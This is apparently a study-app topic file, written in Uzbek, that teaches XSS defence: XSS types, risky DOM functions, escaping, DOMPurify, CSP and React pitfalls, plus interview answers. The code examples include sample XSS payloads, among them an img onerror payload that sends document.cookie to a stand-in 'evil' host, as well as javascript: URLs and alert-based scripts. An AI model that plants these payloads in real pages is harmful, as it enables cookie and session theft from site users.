import type { Topic } from '../../../types'

export const xssProtection: Topic = {
  id: 'xss-protection',
  title: 'XSS Himoyasi',
  importance: 3,
  status: 'to-learn',
  description: 'Cross-Site Scripting turlari, xavfli funksiyalar, himoya usullari, DOMPurify',
  content: `XSS (Cross-Site Scripting) — veb-ilovalardagi eng keng tarqalgan xavfsizlik zaifliklaridan biri. Hujumchi zararli JavaScript kodni sahifaga kiritadi va foydalanuvchi brauzerida ishga tushiradi.

═══════════════════════════════════════
  XSS TURLARI
═══════════════════════════════════════

1. STORED XSS (Saqlangan)
   Zararli kod SERVERda saqlanadi (ma'lumotlar bazasi).
   Har bir foydalanuvchi sahifani ochganda skript ishlaydi.
   Eng xavfli tur — ko'p foydalanuvchiga ta'sir qiladi.
   Misol: forum sharh, profil bio, blog post.

2. REFLECTED XSS (Qaytarilgan)
   Zararli kod URL yoki so'rov parametrida.
   Server javobga qo'shib qaytaradi.
   Foydalanuvchi maxsus URL ni bosishi kerak.
   Misol: qidiruv natijasi, xato xabarlari.

3. DOM-BASED XSS
   Kod serverga BORMASDAN, faqat brauzerda ishlaydi.
   JavaScript o'zi DOM ni xavfli tarzda o'zgartiradi.
   Misol: location.hash, document.referrer ni innerHTML ga yozish.

═══════════════════════════════════════
  XAVFLI FUNKSIYALAR VA XUSUSIYATLAR
═══════════════════════════════════════

1. innerHTML — HTML ni parse qiladi, <script> ham ishlaydi
   MUHIM: innerHTML orqali kiritilgan <script> bevosita
   ishlamaydi, LEKIN <img onerror> va boshqa event handler lar
   ishlaydi — bu ham XSS!

2. outerHTML — innerHTML ga o'xshash xavf

3. document.write() — sahifaga to'g'ridan-to'g'ri yozish

4. eval() — stringni JavaScript sifatida bajarish.
   HECH QACHON foydalanuvchi kiritgan ma'lumot bilan ishlatmang!

5. Function("kod") — eval() ga teng xavfli

6. setTimeout(string) / setInterval(string) — string berilsa
   eval() kabi ishlaydi

7. location.href = userInput — javascript: protocol xavfi

═══════════════════════════════════════
  HIMOYA USULLARI
═══════════════════════════════════════

1. TEXTCONTENT ISHLATISH
   innerHTML o'rniga textContent — HTML parse qilmaydi.
   element.textContent = userInput  // Xavfsiz

2. INPUT SANITIZATION
   Foydalanuvchi kiritgan ma'lumotni tozalash:
   - HTML teglarni olib tashlash yoki escape qilish
   - DOMPurify kutubxonasi — eng ishonchli

3. OUTPUT ENCODING
   Ma'lumotni ko'rsatishdan oldin encode qilish:
   < → &lt;  > → &gt;  & → &amp;  " → &quot;

4. CONTENT SECURITY POLICY (CSP)
   HTTP header bilan qaysi manbalardan skript yuklanishini
   cheklash: Content-Security-Policy: script-src 'self'
   Inline script va eval() ni bloklash mumkin.

5. HTTPONLY COOKIES
   Cookie ga HttpOnly flag — JavaScript dan kirish taqiqlanadi.
   document.cookie orqali o'g'irlab bo'lmaydi.

═══════════════════════════════════════
  REACT DA XSS HIMOYASI
═══════════════════════════════════════

React AVTOMATIK himoya qiladi — JSX ichidagi qiymatlarni
string sifatida render qiladi, HTML sifatida emas.

  <div>{userInput}</div>  // Xavfsiz — HTML escape qilinadi

LEKIN dangerouslySetInnerHTML — XSS xavfi:
  <div dangerouslySetInnerHTML={{ __html: userInput }} />
  Bu NOM bilan ogohlantirilgan — faqat TOZALANGAN HTML bilan!

MUHIM: href, src kabi atributlarda ham ehtiyot bo'lish kerak:
  <a href={userInput}>Link</a>  // javascript:alert(1) xavfi!

═══════════════════════════════════════
  INPUT VALIDATION
═══════════════════════════════════════

Validatsiya IKKI TOMONLAMA bo'lishi kerak:
1. CLIENT — UX uchun (tezkor qayta aloqa)
2. SERVER — XAVFSIZLIK uchun (client ni chetlab o'tish mumkin)

MUHIM: Faqat client validatsiyasi YETARLI EMAS!
Hujumchi DevTools, curl, Postman orqali bevosita server ga
so'rov yuborishi mumkin.`,
  codeExamples: [
    {
      title: 'XSS hujum misollari — qanday ishlaydi',
      language: 'js',
      code: `// ═══ Stored XSS ═══
// Hujumchi forum sharhiga yozadi:
const maliciousComment = '<img src=x onerror="document.location=evil+document.cookie">'

// Server bu sharhni saqlaydi va boshqa foydalanuvchilarga ko'rsatadi
// ❌ XAVFLI — innerHTML bilan ko'rsatish
commentDiv.innerHTML = maliciousComment
// Natija: foydalanuvchining cookie lari o'g'irlanadi!

// ═══ Reflected XSS ═══
// URL: https://site.com/search?q=<script>alert(1)</script>
const query = new URLSearchParams(location.search).get("q")
// ❌ XAVFLI
document.getElementById("result").innerHTML = "Natija: " + query

// ═══ DOM-based XSS ═══
// URL: https://site.com/page#<img src=x onerror=alert(1)>
const hash = location.hash.slice(1)
// ❌ XAVFLI
document.getElementById("content").innerHTML = decodeURIComponent(hash)

// ═══ eval() xavfi ═══
const userInput = 'alert(document.cookie)'
// ❌ HECH QACHON!
eval(userInput)
new Function(userInput)()
setTimeout(userInput, 0)  // string berilsa eval kabi ishlaydi

// ═══ javascript: protocol ═══
const link = "javascript:alert(document.cookie)"
// ❌ XAVFLI
location.href = link
// <a href={link}> ham xavfli!`,
      description: 'XSS hujumning barcha turlari va xavfli funksiyalar',
    },
    {
      title: 'innerHTML xavfi va xavfsiz muqobillar',
      language: 'js',
      code: `// ❌ innerHTML — XSS xavfi
const userInput = '<img src=x onerror="alert(1)">'
element.innerHTML = userInput  // Skript ishlaydi!

// ✅ textContent — xavfsiz, HTML parse qilmaydi
element.textContent = userInput
// Ko'rinadi: <img src=x onerror="alert(1)"> (matn sifatida)

// ✅ createElement + textContent
function safeRender(text) {
  const p = document.createElement("p")
  p.textContent = text
  container.appendChild(p)
}

// ✅ Template literal bilan escape
function escapeHTML(str) {
  const div = document.createElement("div")
  div.textContent = str
  return div.innerHTML
}

escapeHTML('<script>alert("xss")</script>')
// "&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;"

// ✅ Qo'lda escape funksiyasi
function escapeForHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;")
}

// ✅ URL validatsiya
function isSafeURL(url) {
  try {
    const parsed = new URL(url)
    return ["http:", "https:"].includes(parsed.protocol)
  } catch {
    return false
  }
}

isSafeURL("https://example.com")         // true
isSafeURL("javascript:alert(1)")         // false`,
      description: 'innerHTML o\'rniga xavfsiz muqobillar va HTML escape',
    },
    {
      title: 'DOMPurify bilan sanitization',
      language: 'js',
      code: `// DOMPurify — eng ishonchli HTML sanitization kutubxonasi
// npm install dompurify
import DOMPurify from "dompurify"

// Foydalanuvchi kiritgan HTML
const dirtyHTML = \`
  <h1>Salom</h1>
  <p>Matn <b>qalin</b> va <i>yotiq</i></p>
  <script>alert("XSS!")</script>
  <img src=x onerror="stealCookies()">
  <a href="javascript:alert(1)">Bosing</a>
  <div onmouseover="hack()">Hover</div>
\`

// ✅ Tozalash
const cleanHTML = DOMPurify.sanitize(dirtyHTML)
console.log(cleanHTML)
// <h1>Salom</h1>
// <p>Matn <b>qalin</b> va <i>yotiq</i></p>
// <img src="x">
// <a>Bosing</a>
// <div>Hover</div>
// script, onerror, javascript:, onmouseover — OLIB TASHLANDI!

// Ruxsat berilgan teglarni cheklash
const strictClean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ["b", "i", "p", "br"],
  ALLOWED_ATTR: []
})
// Faqat b, i, p, br teglar qoladi

// React da ishlatish
function SafeContent({ htmlContent }) {
  const clean = DOMPurify.sanitize(htmlContent)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// ❌ HECH QACHON bunday qilmang
function UnsafeContent({ htmlContent }) {
  return <div dangerouslySetInnerHTML={{ __html: htmlContent }} />
  // Tozalanmagan HTML = XSS!
}`,
      description: 'DOMPurify bilan xavfli HTML ni xavfsiz qilish',
    },
    {
      title: 'React da XSS himoyasi',
      language: 'js',
      code: `// ✅ React AVTOMATIK himoya qiladi
function Comment({ text }) {
  // text = '<script>alert("xss")</script>'
  return <p>{text}</p>
  // Render: &lt;script&gt;alert("xss")&lt;/script&gt;
  // Script ISHLAMAYDI — matn sifatida ko'rinadi
}

// ✅ Atributlar ham xavfsiz
function UserAvatar({ name }) {
  return <img alt={name} />
  // name = '" onload="alert(1)' bo'lsa ham xavfsiz
}

// ⚠️ LEKIN: ba'zi joylar xavfli

// 1. dangerouslySetInnerHTML
function RichContent({ html }) {
  // ❌ Tozalanmagan HTML
  return <div dangerouslySetInnerHTML={{ __html: html }} />

  // ✅ DOMPurify bilan tozalash
  const clean = DOMPurify.sanitize(html)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// 2. href atributi
function UserLink({ url }) {
  // ❌ javascript: protocol ishlaydi!
  return <a href={url}>Link</a>

  // ✅ Protokolni tekshirish
  const safeUrl = /^https?:/.test(url) ? url : "#"
  return <a href={safeUrl}>Link</a>
}

// 3. style atributi
function StyledDiv({ userColor }) {
  // ❌ expression() xavfi (eski IE)
  return <div style={{ color: userColor }} />

  // ✅ Ruxsat etilgan ranglarni tekshirish
  const allowedColors = ["red", "blue", "green"]
  const safeColor = allowedColors.includes(userColor) ? userColor : "black"
  return <div style={{ color: safeColor }} />
}

// 4. Refs bilan DOM manipulation
function UnsafeRef() {
  const ref = useRef(null)
  useEffect(() => {
    // ❌ innerHTML = XSS xavfi
    ref.current.innerHTML = userInput

    // ✅ textContent = xavfsiz
    ref.current.textContent = userInput
  })
  return <div ref={ref} />
}`,
      description: 'React ning avtomatik XSS himoyasi va xavfli holatlar',
    },
    {
      title: 'Content Security Policy (CSP)',
      language: 'js',
      code: `// CSP — brauzerga qaysi resurslar yuklanishini aytadi
// HTTP header orqali sozlanadi

// ═══ Asosiy CSP direktivlari ═══
// Content-Security-Policy: directive1; directive2; ...

// 1. Faqat o'z saytdan skript va style
// Content-Security-Policy: default-src 'self'

// 2. Tashqi CDN ga ruxsat
// Content-Security-Policy: script-src 'self' https://cdn.example.com

// 3. Inline script va eval() ni taqiqlash (default)
// Content-Security-Policy: script-src 'self'
// <script>alert(1)</script> — BLOKLANADI
// eval("code") — BLOKLANADI

// 4. Nonce bilan inline ruxsat
// Content-Security-Policy: script-src 'nonce-abc123'
// <script nonce="abc123">safeCode()</script> — RUXSAT
// <script>maliciousCode()</script> — BLOKLANADI

// ═══ Meta tag bilan CSP ═══
// <meta http-equiv="Content-Security-Policy"
//   content="default-src 'self'; script-src 'self'">

// ═══ Node.js/Express da CSP ═══
const helmet = require("helmet")

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://fonts.googleapis.com"],
    objectSrc: ["'none'"],      // Flash va boshqalarni taqiqlash
    upgradeInsecureRequests: [], // HTTP → HTTPS
  }
}))

// ═══ CSP xato reportini olish ═══
// Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
// Bu bloklaMASdan faqat xabar yuboradi — test uchun foydali`,
      description: 'Content Security Policy bilan skript yuklanishini cheklash',
    },
  ],
  interviewQA: [
    {
      question: 'XSS nima va qanday turlari bor?',
      answer: 'XSS (Cross-Site Scripting) — hujumchi zararli JavaScript kodni veb-sahifaga kiritadi va boshqa foydalanuvchilar brauzerida ishga tushiradi. 3 turi: 1) Stored XSS — kod serverda saqlanadi (DB), har bir foydalanuvchiga ta\'sir qiladi (eng xavfli). 2) Reflected XSS — kod URL parametrida, server javobga qo\'shadi, foydalanuvchi maxsus URL bosishi kerak. 3) DOM-based XSS — serverga bormasdan, JS o\'zi DOM ni xavfli o\'zgartiradi (innerHTML, location.hash). Oqibatlari: cookie o\'g\'irlash, session hijack, sahifani o\'zgartirish, keylogger o\'rnatish.',
    },
    {
      question: 'innerHTML nima uchun xavfli va nima ishlatish kerak?',
      answer: 'innerHTML foydalanuvchi kiritgan ma\'lumotni HTML sifatida parse qiladi. <script> tegi bevosita ishlamasa ham, <img onerror>, <svg onload>, <a href="javascript:"> kabi event handler lar ishlaydi — bu XSS. Muqobillar: 1) textContent — HTML parse qilmaydi, matn sifatida ko\'rsatadi. 2) createElement + textContent — xavfsiz DOM yaratish. 3) DOMPurify.sanitize() — agar HTML kerak bo\'lsa, tozalash. 4) React da JSX — avtomatik escape qiladi. Umumiy qoida: foydalanuvchi kiritgan ma\'lumotni HECH QACHON innerHTML ga to\'g\'ridan-to\'g\'ri yozmang.',
    },
    {
      question: 'React da XSS dan qanday himoya qilinadi?',
      answer: 'React avtomatik himoya qiladi — JSX ichidagi {expression} ni string sifatida render qiladi, HTML escape qiladi. LEKIN xavfli holatlar bor: 1) dangerouslySetInnerHTML — HTML ni to\'g\'ridan-to\'g\'ri kiritadi, DOMPurify bilan tozalash SHART. 2) href atributi — javascript: protocol ishlaydi, protokolni tekshirish kerak. 3) ref.current.innerHTML — React himoyasini chetlab o\'tadi. 4) Server-side rendering da ham ehtiyot bo\'lish kerak. Best practice: dangerouslySetInnerHTML dan qoching, agar kerak bo\'lsa DOMPurify ishlating, URL larni validatsiya qiling.',
    },
    {
      question: 'Content Security Policy (CSP) nima va qanday ishlaydi?',
      answer: 'CSP — HTTP header orqali brauzerga qaysi manbalardan resurs (script, style, image) yuklanishini aytish. Content-Security-Policy: script-src \'self\' — faqat o\'z saytdan skript. Asosiy direktivlar: default-src, script-src, style-src, img-src, connect-src, font-src. \'self\' — faqat o\'z domen, \'none\' — umuman taqiq, nonce — maxsus token bilan inline ruxsat. CSP inline script va eval() ni default bloklaydi — bu XSS ning asosiy hujum vektorlarini yo\'q qiladi. Report-Only rejimida avval test qilish mumkin.',
    },
    {
      question: 'eval() nima uchun xavfli va qanday muqobillari bor?',
      answer: 'eval() stringni JavaScript kodi sifatida bajaradi. Xavflari: 1) XSS — foydalanuvchi kiritgan ma\'lumot eval() ga tushsa, har qanday kod bajariladi. 2) Performance — V8 eval() ni optimallashtira olmaydi. 3) Scope xavfi — lokal o\'zgaruvchilarga kirish mumkin. O\'xshash xavfli funksiyalar: new Function("kod"), setTimeout("kod"), setInterval("kod"). Muqobillar: JSON.parse() (JSON uchun), template literal, switch/if (shartli logika), Map/Object (dinamik mapping). CSP header bilan eval() ni butunlay bloklash mumkin.',
    },
    {
      question: 'Client-side va server-side validatsiya farqi nima?',
      answer: 'Client-side validatsiya — brauzerda, UX uchun (tezkor feedback). Server-side validatsiya — serverda, XAVFSIZLIK uchun. MUHIM: faqat client validatsiya YETARLI EMAS — hujumchi DevTools, curl, Postman orqali bevosita serverga so\'rov yuborishi mumkin, client validatsiyani to\'liq chetlab o\'tadi. Shuning uchun IKKI TOMONLAMA validatsiya kerak: client — foydalanuvchi qulayligi uchun, server — xavfsizlik uchun. Server da: input sanitization, parametrized queries (SQL injection), output encoding, rate limiting.',
    },
  ],
}
